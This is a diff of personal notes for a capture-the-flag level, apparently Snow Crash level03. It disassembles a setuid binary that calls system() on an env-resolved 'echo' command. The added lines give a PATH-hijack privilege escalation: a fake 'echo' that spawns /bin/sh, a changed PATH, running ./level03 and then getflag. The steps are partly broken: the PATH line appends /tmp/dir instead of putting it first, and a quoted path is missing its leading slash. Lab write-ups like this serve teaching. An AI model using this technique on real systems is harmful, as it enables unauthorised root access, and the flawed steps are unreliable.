@@ -21,18 +21,24 @@ disass main:
    0x080484e7 <+67>:	mov    %eax,0x4(%esp)
    0x080484eb <+71>:	mov    0x1c(%esp),%eax
    0x080484ef <+75>:	mov    %eax,(%esp)
-   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt> ; idem call setresuid with geteuid for all params
-   0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
+   0x080484f2 <+78>:	call   0x8048380 <setresuid@plt> ; idem call setresuid with geteuid() for all params
+   0x080484f7 <+83>:	movl   $0x80485e0,(%esp) "usr/bin/env echo Exploit me"
    0x080484fe <+90>:	call   0x80483b0 <system@plt> ; print "exploit me\n"
    0x08048503 <+95>:	leave
    0x08048504 <+96>:	ret
 
 
-stack frame de 32 octets
+make new echo binary in /tmp/dir
 
-getegid res (int) => esp + 24
-geteuid res (int) => esp + 28
+int main(void)
+{
+	system("/bin/sh");
+	return 0;
+}
 
+export PATH=$PATH:/tmp/dir
 
-uid=3003(flag03) gid=3003(flag03) groups=3003(flag03),1001(flag)
-replace by 3003  !!
+./level03
+
+getflag
+
